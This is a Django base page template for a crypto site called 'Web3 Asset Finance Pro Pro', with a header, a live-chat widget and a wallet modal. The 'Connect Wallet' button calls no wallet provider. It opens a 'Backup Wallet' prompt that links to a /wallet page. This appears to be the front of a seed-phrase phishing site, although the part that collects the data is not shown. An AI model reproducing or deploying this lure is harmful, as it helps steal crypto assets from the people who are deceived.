{% load static %}
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>
        Web3 Asset Finance Pro Pro - A crypto buy and sell marketplace
    </title>
    <link rel="stylesheet" href="{% static 'app/style.css' %}" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-sRIl4kxILFvY47J16cr9ZwB07vP4J8+LH7qKQnuqkuIAvNWLzeN8tE5YBujZqJLB" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-FKyoEForCGlyvwx9Hj09JcYn3nv7wiPVlz7YYwJrWVcXK/BmnVDxM+D2scQbITxI"
        crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css">

    <link rel="shortcut icon" href="{% static 'app/image/icon.png' %}" type="image/x-icon">
    {% block extra_head %}{% endblock %}
</head>

<body>
    <div class="page-shell">
        <header class="topbar">
            <div class="brand">
                <a href="{% url 'home' %}" class="brand-link">
                    <img src="{% static 'app/image/logo.webp' %}" alt="Web3Finance Logo" class="logo" />
                </a>
            </div>
            <button type="button" class="connect-btn wallet-connect-trigger">Connect Wallet</button>
        </header>

        <main class="hero-content">
            {% block content %}{% endblock %}
        </main>
    </div>

    {% block full_bleed %}{% endblock %}

    <div class="modal fade wallet-modal" id="walletModal" tabindex="-1" aria-labelledby="walletModalLabel"
        aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <div>
                        <h2 class="modal-title" id="walletModalLabel">Connect Wallet</h2>
                        <p class="wallet-modal-subtitle">Gateway to Web3</p>
                    </div>
                    <button type="button" class="wallet-modal-close" data-bs-dismiss="modal" aria-label="Close">
                        <i class="bi bi-x-lg" aria-hidden="true"></i>
                    </button>
                </div>
                <div class="modal-body">
                    <h3 class="wallet-modal-heading">Backup Wallet</h3>
                    <button type="button" class="wallet-option">
                        <span class="wallet-option-icon"><img src="{% static 'app/image/icon.png' %}" width="20"
                                alt=""></span>
                        <span class="wallet-option-copy">
                            <strong>Automatic/Manual backup</strong>
                            <small>Secure your wallet and recover your assets</small>
                        </span>
                        <span class="wallet-option-action"> <a class="text-decoration-none text-white"
                                href="/wallet">Continue</a></span>
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script src="{% static 'app/stats.js' %}"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            document.querySelectorAll('.wallet-connect-trigger').forEach(function (trigger) {
                trigger.setAttribute('data-bs-toggle', 'modal');
                trigger.setAttribute('data-bs-target', '#walletModal');
            });
        });
    </script>
    <script type="text/javascript">
        (function (w, d, v3) {
            w.chaportConfig = {
                appId: '6a840c81cdcf44268e703aed',
            };

            if (w.chaport) return; v3 = w.chaport = {}; v3._q = []; v3._l = {}; v3.q = function () { v3._q.push(arguments) }; v3.on = function (e, fn) { if (!v3._l[e]) v3._l[e] = []; v3._l[e].push(fn) }; var s = d.createElement('script'); s.type = 'text/javascript'; s.async = true; s.src = 'https://app.chaport.com/javascripts/insert.js'; var ss = d.getElementsByTagName('script')[0]; ss.parentNode.insertBefore(s, ss)
        })(window, document);
    </script>
    {% block extra_scripts %}{% endblock %}

</body>

</html>
